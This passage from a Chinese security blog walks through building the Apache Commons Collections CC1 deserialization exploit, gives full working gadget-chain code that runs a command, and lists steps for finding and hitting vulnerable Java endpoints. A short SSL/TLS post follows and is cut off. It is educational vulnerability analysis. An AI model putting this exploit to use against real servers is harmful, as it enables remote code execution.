class_">Object</span>[]{<span class="hljs-string">"calc"</span>});<br>    <span class="hljs-comment">// 第二层</span><br>    Map&lt;Object,Object&gt; map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>    map.put(<span class="hljs-string">"Hacking"</span>,<span class="hljs-string">"3xsh0re"</span>);<br><br>    <span class="hljs-comment">// TransformedMap.decorate方法调用TransformedMap的构造方法</span><br>    Map&lt;Object,Object&gt; transformedMap = TransformedMap.<br>                                         decorate(map, <span class="hljs-literal">null</span>, invokerTransformer);<br>    <span class="hljs-comment">// AbstractInputCheckedMapDecorator类中的MapEntry类的setValue()方法（作用是遍历map）</span><br>    <span class="hljs-keyword">for</span>(Map.Entry entry:transformedMap.entrySet()){<br>        entry.setValue(shell);<br>    }<br>}<br></code></pre></td></tr></table></figure><p>可以成功弹出计算器：</p><img src="/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240710140835192.png" class=""><p>此时我们右键setValue函数查看调用，发现在AnnotationInvocationHandler类中一处readObject函数对它进行了调用。</p><img src="/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240710105700846.png" class="" title="image-20240710105700846"><p>注意：如果你的调用中没有出现这个类，你应当下载源码，<a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/file/6bfaecb8ff77/src/share/classes/sun">jdk下载网页</a>，下载后解压其中/src/share/classes/sun到自己jdk的src文件夹中</p><img src="/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240710141928459.png" class=""><p>找到自己的文件夹，解压进去，</p><img src="/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240710142053339.png" class=""><p>然后在IDEA中项目属性里添加源码路径，CTRL+shift+alt+s打开</p><img src="/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240710142224933.png" class="" title="image-20240710142224933"><p>ok，现在你已经可以找到我们的最后的入口函数了，可以发现readObject正好符合我们的调用方式，用构造的恶意序列化流进入这处readObject就可以完成CC1链了，但是有一个问题，AnnotationInvocationHandler类不是公开的，仅可在同一个包下可访问也就是在外面无法通过名字来调用，因此<strong>只可以用反射获取这个类</strong>。</p><p>这个类的构造方法为，也就是说需要一个注解类和一个Map类，这个注解类的选取是有讲究的，后面再探，先设置为Override注解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">AnnotationInvocationHandler(Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span>&gt; type, <br>                            Map&lt;String, Object&gt; memberValues)<br></code></pre></td></tr></table></figure><p>然后我们通过反射调用readObject方法，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);<br><span class="hljs-type">Constructor</span> <span class="hljs-variable">annotationConstructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);<br>annotationConstructor.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> annotationConstructor.newInstance(Override.class, transformedMap);<br></code></pre></td></tr></table></figure><p>于是乎，我们现在的代码应该写成下面这样：记得抛出异常和写好序列化和反序列化函数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception{<br>    <span class="hljs-comment">// 获取一个runtime实例</span><br>    <span class="hljs-type">Runtime</span> <span class="hljs-variable">shell</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>    <span class="hljs-comment">// 第一层</span><br>    <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"exec"</span>,<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class},<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"calc"</span>});<br>    <span class="hljs-comment">// 第二层</span><br>    Map map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>    map.put(<span class="hljs-string">"Hacking"</span>,<span class="hljs-string">"3xsh0re"</span>);<br><br>    <span class="hljs-comment">//TransformedMap.decorate方法调用TransformedMap的构造方法</span><br>    <span class="hljs-comment">//构造方法把invoker实例赋值给TransformedMap.valueTransformer属性。</span><br>    <span class="hljs-type">Map</span> <span class="hljs-variable">transformedMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(map, <span class="hljs-literal">null</span>, invokerTransformer);<br><br>    <span class="hljs-comment">// 通过反射获取AnnotationInvocationHandler的实例</span><br>    <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);<br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">annotationConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);<br>    annotationConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> annotationConstructor.newInstance(Override.class, transformedMap);<br>    serialize(obj);<br>    unserialize(<span class="hljs-string">"./exec.bin"</span>);<br><br>}<br><br><span class="hljs-comment">//序列化方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object object)</span> <span class="hljs-keyword">throws</span> Exception {<br>    <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">"./exec.bin"</span>));<br>    oos.writeObject(object);<br>}<br><br><span class="hljs-comment">//反序列化方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> Exception {<br>    <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>    objectInputStream.readObject();<br>}<br></code></pre></td></tr></table></figure><h3 id="链子中的小巧思"><a href="#链子中的小巧思" class="headerlink" title="链子中的小巧思"></a>链子中的小巧思</h3><p>可以发现写完这段运行之后并没有弹出计算器，其实一条可用的序列化链的构造是非常精心的，里面有许多弯弯绕绕，并不是应该这么写所以就这么写，每一个环节都有其出现的必要性。这里我们正向调试一番，看看问题到底出现在哪里：</p><p>首先在序列化函数中的readObject方法处打上断点，</p><img src="/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240711144412509.png" class="" title="image-20240711144412509"><p>你可以选择一步一步调试去分析整个反序列化的过程，这里我就不单步调试了，我们直到obj的最后一层是一个AnnotationInvocationHandler的实例，那么我们就直接在它的readObject函数打上断点，直接恢复项目运行，可以发现到了我们的断点处，然后可以单步调试了</p><img src="/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240711150022111.png" class="" title="image-20240711150022111"><p>发现在下面判断memberType时，<code>memberType==null</code>，直接就跳转到了函数末尾，所以根本就没有执行之后的序列化过程。</p><img src="/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240711150233063.png" class="" title="image-20240711150233063"><p>ok，这里出问题，那么怎么解决呢，找到memberTypes从哪里来的，在上面几行代码中，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">annotationType = AnnotationType.getInstance(type);<br>Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br></code></pre></td></tr></table></figure><p>这里就和我说的在构造该对象时，注解类的问题了，<strong>Override根本就没有成员，所以为null，所以构造的时候注解的选取不是随意的</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Target(ElementType.METHOD)</span><br><span class="hljs-meta">@Retention(RetentionPolicy.SOURCE)</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> Override {<br>}<br></code></pre></td></tr></table></figure><p>所以我们将源代码的map的key改为Target注解中的成员变量value，构造时传入Target类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 第二层</span><br>Map map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>map.put(<span class="hljs-string">"value"</span>,<span class="hljs-string">"3xsh0re"</span>);<br><span class="hljs-comment">//...</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> annotationConstructor.newInstance(Target.class, transformedMap);<br></code></pre></td></tr></table></figure><p>重新调试到此处，发现已经成功绕过第一层if了</p><img src="/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240711152007941.png" class="" title="image-20240711152007941"><p>此时我们运行整个代码发现报错了，这是为什么呢，其实是因为Runtime类没有继承serialize接口，所以runtime对象不能被序列化，自然也不能被反序列化。这里解决方法，非常巧妙，<strong>虽然Runtime对象不可以被序列化，但是Class对象可以被序列化。</strong>那么结合InvokerTransformer和反射可以写出下面的代码：</p><p>其实非常好理解，比如第一个，就是执行<code>getDeclaredMethod</code>找到<code>getRuntime</code>函数。</p><p>实现逻辑，构造对象的参数是<code>getDeclaredMethod</code>和<code>getRuntime</code>的对象，执行它的<code>transform</code>方法，在这个方法中，<code>Runtime.class</code>的作用是通过<code>getMethod</code>找到它的<code>getDeclaredMethod</code>函数，然后将<code>getRuntime</code>作为参数。</p><p>这整个语句的返回值就是<code>getRuntime</code>函数，即<code>getDeclaredMethod</code>的返回值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Class clazz = Runtime.class;</span><br><span class="hljs-comment">//Method getRuntimeMethod = clazz.getMethod("getRuntime", null);</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">getRunmethod</span> <span class="hljs-operator">=</span> (Method) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"getDeclaredMethod"</span>, <br>                               <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class, Class[].class}, <br>                               <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"getRuntime"</span>, <span class="hljs-literal">null</span>})<br>     .transform(Runtime.class);<br><br><span class="hljs-comment">//Runtime cmd = (Runtime) getRuntimeMethod.invoke(null, null);</span><br><span class="hljs-type">Runtime</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> (Runtime) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"invoke"</span>, <br>                            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{Object.class, Object[].class}, <br>                                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>})<br>    .transform(getRunmethod);<br><span class="hljs-comment">//Method cmdMethod = clazz.getMethod("exec", String.class);</span><br><span class="hljs-comment">//cmdMethod.invoke(cmd, "calc");</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"exec"</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class}, <br>                       <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"calc"</span>}).transform(cmd);<br></code></pre></td></tr></table></figure><p>好了，解决了不能反序列化的问题，但是这样构造破坏了我们的序列化链，之前只有一个<code>InvokerTransformer</code>对象，现在变成了3个，那么如何解决这个问题？</p><p>这时需要一个新的函数，聚焦到<code>org.apache.commons.collections.functors</code>包下面的<code>ChainedTransformer</code>类。</p><p>这个类存在transform方法可以帮我们遍历InvokerTransformer，并且循环调用遍历的InvokerTransformer的transform方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ChainedTransformer</span><span class="hljs-params">(Transformer[] transformers)</span> {<br>    <span class="hljs-built_in">super</span>();<br>    iTransformers = transformers;<br>}<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Transforms the input to result via each decorated transformer</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> object  the input object passed to the first transformer</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> the transformed result</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object object)</span> {<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; iTransformers.length; i++) {<br>        object = iTransformers[i].transform(object);<br>    }<br>    <span class="hljs-keyword">return</span> object;<br>}<br></code></pre></td></tr></table></figure><p>所以只需要把上面的代码构造成一个Transformer数组即可，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]{<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"getMethod"</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class, Class[].class},<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"getRuntime"</span>, <span class="hljs-literal">null</span>),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"invoke"</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{Object.class, Object[].class},<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"exec"</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class},<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"calc"</span>})<br>};<br><span class="hljs-comment">//把transformers的4个Transformer执行</span><br><span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br></code></pre></td></tr></table></figure><p>到这里，Runtime类不能反序列化的问题就解决了。</p><p>但是，有一个致命问题，<strong>在这样使用ChainTransformer时，我们的Runtime.class也就是参数该如何传入？</strong></p><p>会不会有一个Transformer的transform函数就是返回参数本身呢，答案是有的😋</p><p>刚刚好到<code>org.apache.commons.collections.functors</code>包下的<code>ConstantTransformer</code>类。它里面的transform就是返回我们传入的对象，如果我们传入Runtime.class，那返回的也即是Runtime.class。我们可以利用<code>ConstantTransformer</code>类解决问题了。<br>ok，到此为止，我们可以编写完整的payload了。</p><h2 id="完整Exp"><a href="#完整Exp" class="headerlink" title="完整Exp"></a>完整Exp</h2><p>完整项目可以直接从<a href="https://github.com/3xsh0re/CC_ChainDemo">我的测试代码仓库</a>拉取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception{<br>    <span class="hljs-comment">// 第一层</span><br>    Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]{<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"getMethod"</span>,<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class, Class[].class},<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"getRuntime"</span>, <span class="hljs-literal">null</span>}),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"invoke"</span>,<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{Object.class, Object[].class},<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>}),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"exec"</span>,<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class},<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"calc"</span>})<br>    };<br>    <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>    <span class="hljs-comment">// 第二层</span><br>    Map&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>    map.put(<span class="hljs-string">"value"</span>, <span class="hljs-string">"3xsh0re"</span>);<br><br>    <span class="hljs-comment">//TransformedMap.decorate方法调用TransformedMap的构造方法</span><br>    <span class="hljs-comment">//构造方法把invoker实例赋值给TransformedMap.valueTransformer属性。</span><br>    Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, transformerChain);<br><br>    <span class="hljs-comment">// 通过反射获取AnnotationInvocationHandler的实例</span><br>    <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);<br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">annotationConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);<br>    annotationConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> annotationConstructor.newInstance(Target.class, transformedMap);<br>    serialize(obj);<br>    unserialize(<span class="hljs-string">"./exec.bin"</span>);<br>}<br></code></pre></td></tr></table></figure><ol><li><p>漏洞触发场景</p><p>在java编写的web应用与web服务器间java通常会发送大量的序列化对象例如以下场景：</p><ul><li><p>HTTP请求中的参数，cookies以及Parameters。</p></li><li><p>RMI协议，被广泛使用的RMI协议完全基于序列化</p></li><li><p>JMX 同样用于处理序列化对象</p></li><li><p>自定义协议 用来接收与发送原始的java对象</p></li></ul></li><li><p>漏洞挖掘</p><ul><li><p>确定反序列化输入点</p></li><li><p>首先应找出readObject方法调用，在找到之后进行下一步的注入操作。一般可以通过以下方法进行查找：</p><p>源码审计：寻找可以利用的“靶点”，即确定调用反序列化函数readObject的调用地点。</p><p>对该应用进行网络行为抓包，寻找序列化数据，如wireshark,tcpdump等</p><p>注： java序列化的数据一般会以标记（ac ed 00 05）开头，base64编码后的特征为rO0AB。</p></li><li><p>再考察应用的Class Path中是否包含Apache Commons Collections库</p></li><li><p>生成反序列化的payload</p></li><li><p>提交我们的payload数据</p></li></ul></li></ol><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><ul><li>禁止JVM执行外部命令</li><li>TransformedMap 类去掉了 Map.Entry 的 setValue 方法</li></ul>]]></content>
    
    
    <categories>
      
      <category>漏洞分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>详解SSL/TLS</title>
    <link href="/2024/06/28/%E8%AF%A6%E8%A7%A3SSL-TLS/"/>
    <url>/2024/06/28/%E8%AF%A6%E8%A7%A3SSL-TLS/</url>
    
    <content type="html"><![CDATA[<p>其实抛开项目内容不谈，这里我详细分析了SSL/TLS建立安全连接的流程，以及部分加密算法的数学原理，以及SSL是如何工作在CA以及证书上的。</p><span id="more"></span><h3 id="项目内容"><a href="#项目内容" class="headerlink" title="项目内容"></a>项目内容</h3><p>采用Python语言，基于OpenSSL库实现证书颁发机构(CA)程序，并基于证书签发机制和公钥密码体制(RSA算法)实现了SSL握手流程，完成客户端与服务端之间共享密钥的交换，并且在消息传输的过程中采用对称加密算法(AES)对明文消息进行加密。</p><h3 id="CA以及CA的工作原理"><a href="#CA以及CA的工作原理" class="headerlink" title="CA以及CA的工作原理"></a>CA以及CA的工作原理</h3><p>CA是证书颁发机构的简称，证书颁发机构是一个可信任的实体，负责颁发、管理和撤销数字证书。数字证书用于在公钥基础设施 (PKI) 中验证身份，并确保在网络通信中数据的安全性和完整性。</p><p><strong>CA的作用是作为公证人，在一次SSL握手过程中，假设我们没有CA颁发的证书作为验证，那么考虑此时客户端被中间人劫持，在双方交换密钥的过程中，中间人可以自己的公钥发送给客户端，此时客户端没有别的信息来鉴别这个公钥，因此中间人会维持两个对话，一个是中间人-客户端，一个是中间人-服务端。所以此时需要一个中间人来证明这个公钥是可信安全的，CA就出现了，服务端会将自己的公钥（在证书请求文件CSR里）发给CA，CA使用签名算法和CA自己的私钥给这个公钥签名，也就是生成证书，那么客户端就可以使用CA的公钥来对服务端的证书进行验证</strong></p><p>工作过程：</p><ol><li>根证书的基础是一个公钥和私钥对，这对密钥是 CA 用于签署其他证书的核心。这个过程包括：<ul><li><strong>选择加密算法</strong>：常用的算法包括<code>RSA</code>和<code>ECC</code>。<code>RSA</code>通常使用 2048 位或更高的密钥长度，而<code>ECC</code>使用更短但安全性相当的密钥长度（如 256 位）。我们选择的是RSA加密算法。</li><li><strong>生成密钥对</strong>：使用安全的硬件安全模块 (HSM) 或可信的软件工具生成公钥和私钥对。私钥必须严格保密，通常存储在 HSM 中，以防泄露。</li></ul></li><li>CA自身生成证书请求文件，然后对其进行自签名，这个证书称为根证书，作为认证链的基础</li><li>客户端生成证书请求文件.csr，发送给CA进行签名</li><li>签名后返回客户端证书.crt</li></ol><h3 id="公钥基础设施PKI和信任链"><a href="#公钥基础设施PKI和信任链" class="headerlink" title="公钥基础设施PKI和信任链"></a>公钥基础设施PKI和信任链</h3><p>简单来说，PKI就是一套用于管理数字证书的体系结构。</p><p>关于信任链的话，我们知道在建立SSL链接的时候需要使用证书进行身份验证，那么证书颁发机构的安全性又如何保证呢，其实很简单，让更高一级的CA对低一级的CA证书进行签名，这样一层一层的向下保证，<strong>只需要保证根CA的安全性即可</strong>。</p><h3 id="RSA加密算法"><a href="#RSA加密算法" class="headerlink" title="RSA加密算法"></a>RSA加密算法</h3><p><code>RSA（Rivest-Shamir-Adleman）</code>算法是一种<strong>非对称加密算法</strong>，广泛应用于数字证书的颁发和验证过程中。<code>RSA</code>算法在证书颁发中的主要作用包括生成密钥对、加密和解密数据、以及数字签名和验证。<strong>RSA是公钥密码体制中的一个重要算法</strong>。</p><p><strong>公钥</strong>：公开发布并包含在数字证书中，用于加密数据和验证数字签名。<strong>通过公钥我们就可以判断这个证书是否是受信任的CA颁发的。</strong></p><p><strong>私钥</strong>：保密并由持有者妥善保管。<strong>在证书颁发过程中，CA 使用其私钥对证书进行数字签名。</strong></p><p><strong>数学推导：</strong></p><ul><li><p>首先选取两个大素数<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex;" xmlns="http://www.w3.org/2000/svg" width="3.185ex" height="1.439ex" role="img" focusable="false" viewBox="0 -442 1407.7 636"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mo" transform="translate(503,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(947.7,0)"><path data-c="1D45E" d="M33 157Q33 258 109 349T280 441Q340 441 372 389Q373 390 377 395T388 406T404 418Q438 442 450 442Q454 442 457 439T460 434Q460 425 391 149Q320 -135 320 -139Q320 -147 365 -148H390Q396 -156 396 -157T393 -175Q389 -188 383 -194H370Q339 -192 262 -192Q234 -192 211 -192T174 -192T157 -193Q143 -193 143 -185Q143 -182 145 -170Q149 -154 152 -151T172 -148Q220 -148 230 -141Q238 -136 258 -53T279 32Q279 33 272 29Q224 -10 172 -10Q117 -10 75 30T33 157ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g></g></g></svg></mjx-container>。这很重要，RSA的基础就是大素数分解困难问题</p></li><li><p>计算它们的乘积：<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 